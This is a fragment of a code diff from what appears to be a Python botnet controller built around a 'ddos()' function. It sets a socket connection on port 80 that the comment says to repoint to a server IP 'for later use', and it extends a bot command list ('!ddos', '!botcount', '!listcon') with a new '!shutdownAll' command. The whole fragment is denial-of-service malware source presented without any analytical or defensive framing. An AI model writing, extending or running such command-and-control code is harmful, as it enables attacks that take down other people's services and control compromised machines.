@@ -48,7 +48,7 @@ def ddos():
 threads = []
 conn_ip = socket.gethostbyname(socket.gethostname()) #<---- this is for testing purposes. Change the IP to the server ip for later use.
 port = 80
-commands = ['!ddos','!botcount','!listcon']
+commands = ['!ddos','!botcount','!listcon', '!shutdownAll']
 while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
